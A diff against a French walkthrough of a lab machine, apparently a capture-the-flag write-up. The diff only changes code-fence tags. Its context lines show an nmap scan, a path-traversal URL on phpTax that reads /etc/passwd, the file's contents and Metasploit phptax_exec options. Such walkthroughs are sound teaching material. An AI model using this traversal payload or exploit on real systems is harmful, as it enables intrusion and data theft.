@@ -19,7 +19,7 @@ Steady
 
 On commence par l'habituel scan de ports qui nous révèle la présence de deux services accessibles : un serveur web et soit un autre serveur web soit un proxy.  
 
-```plain
+```
 Nmap scan report for 192.168.1.53
 Host is up (0.00021s latency).
 Not shown: 997 filtered ports
@@ -56,11 +56,11 @@ Go !
 
 Maintenant que l'on a accès au site web, on trouve très aisément une vulnérabilité de divulgation de fichiers dans l'application *phpTax* qui est présente :  
 
-```plain
+```
 http://192.168.1.53:8080/phptax/drawimage.php?pfilez=../../../../../../../../../../etc/passwd
 ```
 
-```plain
+```
 root:*:0:0:Charlie &:/root:/bin/csh                                                                                    
 toor:*:0:0:Bourne-again Superuser:/root:                                                                               
 daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin                                                    
@@ -91,7 +91,7 @@ ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin
 
 Une petite recherche sur le web et on apprend qu'il existe un module *Metasploit* pour une faille d'exécution de code dans ce même logiciel. Il faut juste croiser les doigts pour que *Metasploit* s'identifie avec le bon User-Agent sans quoi on va devoir éditer quelques fichiers.  
 
-```plain
+```
 msf exploit(phptax_exec) > show options
 
 Module options (exploit/multi/http/phptax_exec):
@@ -208,7 +208,7 @@ default it would've blocked your IP (both in hosts.allow & Firewall) for
 
 Une petite vérification de la configuration *d'Apache* (dans /usr/local/etc/apache22/) pour nos problèmes de 403 confirme les soupçons que l'on avait :  
 
-```plain
+```
 SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
 
 <VirtualHost *:8080>
